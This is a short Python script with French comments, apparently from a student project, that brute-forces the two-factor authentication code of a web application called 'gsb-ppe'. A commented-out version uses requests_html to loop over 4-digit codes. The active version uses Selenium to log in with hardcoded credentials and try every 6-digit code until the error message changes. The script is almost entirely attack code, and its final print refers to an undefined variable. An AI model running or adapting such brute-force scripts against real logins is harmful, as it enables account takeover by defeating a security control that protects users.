# from requests_html import HTMLSession
#
# # Identifiants connus
# identifiants = {
#     'login': 'lvillachane',
#     'mdp': 'jux7g'
# }
#
# # On utilise HTMLSession avec with pour une fermeture auto à la fin de la structure
# with HTMLSession() as s:
#     # On se connecte au site avec les identifiants connus
#     p = s.post('http://gsb-ppe/index.php?uc=connexion&action=valideConnexion', data=identifiants)
#     # On va boucler sur autant de possibilité de clé que possible
#     for i in range(1000, 9999):
#         code = {
#             'code': i
#         }
#         # On teste le code
#         p = s.post('http://gsb-ppe/index.php?uc=connexion&action=verifA2F', data=code)
#         # On essaye de récupérer la page d'accueil
#         r = s.get('http://gsb-ppe/index.php', data=code)
#         titre = r.html.find('h3', first=True)
#         # Est-ce que l'on est connecté ?
#         if titre.text != "Identification utilisateur":
#             print(r.text)
#             print("Le code est : ",i)
#             # On s'arrête lorsque c'est trouvé !
#             break

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

log = 'lvillachane'
pwd = 'jux7g'

driver = webdriver.Chrome('chromedriver')
driver.get("http://gsb-ppe/index.php")
driver.maximize_window()

login = driver.find_element(By.XPATH, "/html/body/div/div/div/div/div[2]/form/fieldset/div[1]/div/input")
login.clear()
login.send_keys(log)
mdp = driver.find_element(By.XPATH, "/html/body/div/div/div/div/div[2]/form/fieldset/div[2]/div/input")
mdp.clear()
mdp.send_keys(pwd)
driver.find_element(By.XPATH, "/html/body/div/div/div/div/div[2]/form/fieldset/input").click()

for i in range(100000, 999999):
    driver.find_element(By.NAME, "code").send_keys(str(i) + Keys.ENTER)

    if (driver.find_element(By.XPATH, "/html/body/div/div[1]/p").text != 'Code A2F incorrect'):
        print("Le code est ", code)
        break